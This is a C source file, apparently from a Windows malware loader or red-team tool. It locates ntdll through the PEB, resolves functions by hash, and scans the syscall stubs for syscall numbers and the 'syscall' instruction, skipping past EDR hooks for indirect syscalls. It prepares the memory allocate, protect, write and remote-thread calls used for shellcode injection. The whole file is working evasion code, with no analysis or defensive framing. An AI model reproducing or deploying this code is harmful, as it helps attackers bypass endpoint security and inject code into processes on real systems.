//
// Created by ronan on 11/19/24.
//

#include <common.h>

#define RANGE       0x1E

extern GATE Gate;

Syscall CurrentSyscall; // Global syscall struct

// USED TO CUT TIME
BOOL InitializeModule(PMODULE Module) {
    //  CHECK
    if (Module->ArrayOfFunctions != NULL && Module->ArrayOfNames != NULL && Module->ArrayOfOrdinals != NULL)
        return TRUE;


    PPEB                    pPeb            = NULL;
    PLDR_DATA_TABLE_ENTRY   pDte            = NULL;
    PBYTE                   uNtdll          = NULL;

    VxZeroMemoryEx(&Gate.Modules.Ntdll, sizeof(MODULE));

    //  PEB
    pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb == NULL || pPeb->OSMajorVersion != 0xA)
        return FALSE;

    //  NTDLL
    pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    if (!pDte)
        return FALSE;

    Module->BaseAddress = uNtdll = pDte->DllBase;

    //  DOS
    Module->ImgDosHdr = (PIMAGE_DOS_HEADER)uNtdll;
    if (Module->ImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    DEBUG_PRINT("[*] uNtdll: %p, Module->BaseAddress: %p", uNtdll, Module->BaseAddress);

    //  NT
    DEBUG_PRINT("[*] Module->ImgDosHdr->e_lfanew: %X", Module->ImgDosHdr->e_lfanew);
    Module->ImgNtHdrs = (PIMAGE_NT_HEADERS)(uNtdll + Module->ImgDosHdr->e_lfanew);
    DEBUG_PRINT("[*] Module->ImgNtHdrs: %p", Module->ImgNtHdrs);
    if (Module->ImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        DEBUG_PRINT("[!] Mismatching ImgNtHdrs->Signature: %X, expected %X", Module->ImgNtHdrs->Signature, IMAGE_NT_SIGNATURE);
        return FALSE;
    }

    //  EXPORT
    Module->ImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uNtdll + Module->ImgNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);
    if (!Module->ImgExpDir || !Module->ImgExpDir->Base)
        return FALSE;

    //  ARRAYS
    Module->ArrayOfFunctions = (PDWORD)(uNtdll + Module->ImgExpDir->AddressOfFunctions);
    Module->ArrayOfNames     = (PDWORD)(uNtdll + Module->ImgExpDir->AddressOfNames);
    Module->ArrayOfOrdinals   = (PWORD)(uNtdll + Module->ImgExpDir->AddressOfNameOrdinals);

    //  CHECK
    if (!Module->ArrayOfFunctions || !Module->ArrayOfNames || !Module->ArrayOfOrdinals)
        return FALSE;

    return TRUE;
}


BOOL InitializeSyscall (IN ULONG SyscallHash) {
    if (!SyscallHash)
        return FALSE;

    if (!Gate.Modules.Ntdll.BaseAddress)
        return FALSE;


    for (DWORD i = 0; i < Gate.Modules.Ntdll.ImgExpDir->NumberOfFunctions; i++){

        CHAR* cFuncName = (CHAR*) (Gate.Modules.Ntdll.ArrayOfNames[i] + Gate.Modules.Ntdll.BaseAddress);
        if (HashString(cFuncName, StringLengthA(cFuncName)) == SyscallHash) {
            CurrentSyscall.Hash    = SyscallHash;
            CurrentSyscall.Address = (PVOID)(Gate.Modules.Ntdll.ArrayOfFunctions[Gate.Modules.Ntdll.ArrayOfOrdinals[i]] + Gate.Modules.Ntdll.BaseAddress);

            DWORD   j   = 0;

            while (TRUE){

                //  WE REACHED `ret` INSTRUCTION - THAT IS TOO FAR DOWN
                if (*((PBYTE)CurrentSyscall.Address + j) == 0xC3 && !CurrentSyscall.Instruction)
                    return FALSE;

                //  SEARCHING FOR
                //      MOV R10, RCX
                //      MOV RCX, <SSN>
                if (*((PBYTE)CurrentSyscall.Address + j + 0x00) == 0x4C &&
                    *((PBYTE)CurrentSyscall.Address + j + 0x01) == 0x8B &&
                    *((PBYTE)CurrentSyscall.Address + j + 0x02) == 0xD1 &&
                    *((PBYTE)CurrentSyscall.Address + j + 0x03) == 0xB8 ){

                    BYTE    low    = *((PBYTE)CurrentSyscall.Address + j + 0x04);
                    BYTE    high   = *((PBYTE)CurrentSyscall.Address + j + 0x05);

                    // GETTING THE SSN
                    CurrentSyscall.SSN        = (high << 0x08) | low;

                    // GETTING THE ADDRESS OF THE `syscall` INSTRUCTION, SO THAT WE CAN JUMP TO LATER
                    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++){
                        if (*((PBYTE)CurrentSyscall.Address + j + z) == 0x0F && *((PBYTE)CurrentSyscall.Address + j + x) == 0x05) {
                            CurrentSyscall.Instruction = (CurrentSyscall.Address + j + z);
                            break;
                        }
                    }


                    if (CurrentSyscall.SSN && CurrentSyscall.Instruction)
                        return TRUE;
                    else
                        return FALSE;
                }

                // HOOKED
                j++;

            }

        }

    }

    return FALSE;

}


BOOL InitializeSyscalls() { 
    INITIALIZE_SYSCALL(HASH_STR(NtAllocateVirtualMemory))
    INITIALIZE_SYSCALL(HASH_STR(NtProtectVirtualMemory))
    INITIALIZE_SYSCALL(HASH_STR(NtWriteVirtualMemory))
    INITIALIZE_SYSCALL(HASH_STR(NtCreateThreadEx))
    INITIALIZE_SYSCALL(HASH_STR(NtWaitForSingleObject))
    INITIALIZE_SYSCALL(HASH_STR(NtClose))

    return TRUE;
}


VOID GetCurrentSyscallStruct(OUT PSyscall pCurrentSyscall) {
    pCurrentSyscall->Address        = CurrentSyscall.Address;
    pCurrentSyscall->Instruction    = CurrentSyscall.Instruction;
    pCurrentSyscall->Hash           = CurrentSyscall.Hash;
    pCurrentSyscall->SSN            = CurrentSyscall.SSN;
}